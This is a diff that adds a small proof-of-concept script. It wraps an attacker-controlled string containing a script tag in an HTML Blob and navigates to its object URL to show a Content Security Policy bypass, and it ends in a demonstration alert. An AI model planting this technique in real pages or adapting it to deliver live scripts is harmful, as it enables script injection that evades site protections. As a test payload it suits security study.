@@ -1,0 +1,6 @@
+<script>
+  var attackerControlledString = "<script>alert('CSP Bypass');</script>";
+  var blob = new Blob([attackerControlledString], { type: 'text/html' });
+  var url = URL.createObjectURL(blob);
+  location.href = url;
+</script>
